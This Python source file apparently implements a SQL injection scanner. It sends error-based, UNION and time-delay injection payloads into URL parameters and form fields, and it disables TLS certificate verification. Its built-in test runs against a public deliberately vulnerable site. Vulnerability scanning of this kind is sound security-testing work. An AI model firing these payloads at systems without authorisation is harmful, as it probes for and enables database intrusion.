# scanners/sqli_scan.py
import requests
import time
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

# Hide SSL warnings for targets with bad certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Expanded Error Signatures from the Bomberbot guide
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array()",
    "mysql_fetch_assoc()",
    "unclosed quotation mark after the character string",
    "microsoft sql native client error",
    "odbc sql server driver",
    "syntax error at or near",
    "valid postgresql error",
    "ora-00933",
    "quoted string not properly terminated",
    "oracle error",
    "sql syntax error",
    "sqlserver error",
    "microsoft ole db provider for odbc drivers error",
    "microsoft ole db provider for sql server error"
]

# Advanced Payloads including UNION and Time-based injections
PAYLOADS = [
    "'",        
    "\"",      
    "'))",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--+",
    "1' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--"
]

def get_form_details(form):
    """Extracts all action, method, and input details from an HTML form."""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        if input_name:
            inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def run_sqli_scan(target_url: str) -> dict:
    details = []
    session = requests.Session()
    session.headers["User-Agent"] = "VULKN_Scanner/1.0"
    
    print(f"[*] Starting SQLi Scan on: {target_url}")

    # --- PHASE 1: URL PARAMETER INJECTION ---
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    if query_params:
        for payload in PAYLOADS:
            for key, values in query_params.items():
                # Test appending payload to the existing value
                val = values[0] + payload
                malicious_params = query_params.copy()
                malicious_params[key] = [val]
                malicious_query = urlencode(malicious_params, doseq=True)
                test_url = urlunparse(list(parsed_url[:4]) + [malicious_query] + list(parsed_url[5:]))
                
                try:
                    # LOUD DEBUG: This will now show up in Terminal 2
                    print(f"[?] Testing: {test_url}")
                    
                    start_time = time.time()
                    response = session.get(test_url, timeout=10, verify=False)
                    end_time = time.time()
                    
                    res_text = response.text.lower()
                    
                    # Check for Error signatures
                    for error in SQL_ERRORS:
                        if error in res_text:
                            print(f"[!] VULNERABILITY FOUND: {error}")
                            details.append({
                                "type": "Error-Based SQLi",
                                "payload_used": val,
                                "severity": "Critical",
                                "description": f"Database error leaked: '{error}'"
                            })
                            break
                    
                    # Check for Time-based (Fixed logic)
                    duration = end_time - start_time
                    if duration > 4.5 and ("sleep" in payload.lower() or "delay" in payload.lower()):
                        print(f"[!] TIME-BASED VULNERABILITY FOUND: {duration}s")
                        details.append({
                            "type": "Time-Based Blind SQLi",
                            "payload_used": payload,
                            "severity": "Critical",
                            "description": f"Server delayed response by {round(duration, 2)}s"
                        })

                except Exception as e:
                    print(f"[!] Request failed: {e}")
                    continue

    # --- PHASE 2: HTML FORM INJECTION ---
    try:
        response = session.get(target_url, timeout=5, verify=False)
        soup = BeautifulSoup(response.content, "lxml")
        forms = soup.find_all("form")
        
        for form in forms:
            form_details = get_form_details(form)
            form_url = urljoin(target_url, form_details["action"])
            
            for payload in PAYLOADS:
                data = {}
                for input_data in form_details["inputs"]:
                    if input_data["type"] == "hidden" or input_data["value"]:
                        data[input_data["name"]] = input_data["value"]
                    elif input_data["type"] != "submit":
                        data[input_data["name"]] = payload

                try:
                    start_time = time.time()
                    if form_details["method"] == "post":
                        res = session.post(form_url, data=data, timeout=10, verify=False)
                    else:
                        res = session.get(form_url, params=data, timeout=10, verify=False)
                    end_time = time.time()
                    
                    res_text = res.text.lower()
                    
                    # Error-Based Check
                    for error in SQL_ERRORS:
                        if error in res_text:
                            details.append({
                                "type": "Error-Based SQLi (Form Input)",
                                "payload_used": payload,
                                "severity": "Critical",
                                "description": f"Form at {form_url} is vulnerable. Matched signature: '{error}'"
                            })
                            break
                            
                    # Time-Based Check
                    if (end_time - start_time) > 4.5 and ("delay" in payload.lower() or "sleep" in payload.lower()):
                        details.append({
                            "type": "Time-Based Blind SQLi (Form Input)",
                            "payload_used": payload,
                            "severity": "Critical",
                            "description": f"Form at {form_url} delayed response by > 5 seconds."
                        })
                except requests.RequestException:
                    continue
                    
    except requests.RequestException as e:
        pass # Target might be unreachable

    unique_details = [dict(t) for t in {tuple(d.items()) for d in details}]
    return {
        "scanner_name": "Advanced SQL Injection Engine",
        "target_url": target_url,
        "vulnerabilities_found": len(unique_details),
        "details": unique_details
    }

# Test it locally!
if __name__ == "__main__":
    import json
    vulnerable_target = "http://testphp.vulnweb.com/artists.php?artist=1"
    
    print("Running advanced SQLi scan (Forms & Time-Based included)...")
    result = run_sqli_scan(vulnerable_target)
    print(json.dumps(result, indent=4))